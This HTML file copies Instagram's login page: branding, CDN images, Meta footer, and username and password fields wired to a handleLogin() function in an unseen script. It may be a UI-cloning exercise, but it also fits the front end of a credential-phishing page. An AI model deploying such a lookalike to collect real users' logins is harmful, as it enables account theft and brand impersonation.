<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="./insta.png" type="image/x-icon">
    <title>Login ▪ Instagram</title>
</head>
<body>
    <div class="baseDiv">
        <div class="bigborderedDiv">
            <!-- <div class="instaLogo">Instargram</div> -->
            <div class="instaLogo"><img src="./NameLogo.png" alt=""></div>
            <div class="inputsDiv">
                <div>
                    <input type="text" name="" id="userID" placeholder="Phone number, username, or email"> 
                </div>
                <div>
                    <input type="password" name="" id="userKey" placeholder="Password"> 
                </div>
                <div>
                    <button onclick= "handleLogin()" >Log in</button>
                </div>
            </div>
            <div class="breakDiv">
                <hr/>
                <p>OR</p>
            </div>
            <div class="fbLoginDiv">
                <img src="./fb.png" alt="logo">
                <a href="">
                   Log in with Facebook
                </a>
            </div>
            <div class="forgotPassword"> 
               <p>
                Forgot password?
               </p> 
            </div>

        </div>
        <div class="smallborderedDiv">
            <div>
                <p>
                    Don't have an account? 
                    <a href="">Sign Up</a>
                </p>
            </div>
        </div>
        <div class="getAppDiv">
            Get the App
        </div>
        <div class="appDiv">
            <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="google">
            <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" alt="apple">
        </div>
        <div class="footer">
            <div class="links"> 
                <span><a href="">Meta</a></span>
                <span><a href="">About</a></span>
                <span><a href="">Blog</a></span>
                <span><a href="">Jobs</a></span>
                <span><a href="">Help</a></span>
                <span><a href="">API</a></span>
                <span><a href="">Privacy</a></span>
                <span><a href="">Terms</a></span>
                <span><a href="">Locations</a></span>
                <span><a href="">InstagramLite</a></span>
                <span><a href="">Threads</a></span>
                <span><a href="">Contact Uploading & Non-Users</a></span>
                <span><a href="">Meta Verified</a></span>
            </div>
            <div class="copyRightDiv">
                <select name="" id="">
                    <option value="">English</option>
                    <option value="">Hindi</option>
                    <option value="">German</option>
                </select>
                <p>
                    © 2025 Instagram from Meta
                </p>
            </div>
        </div>



    </div>
    <script src="index.js"></script>
</body>
</html>
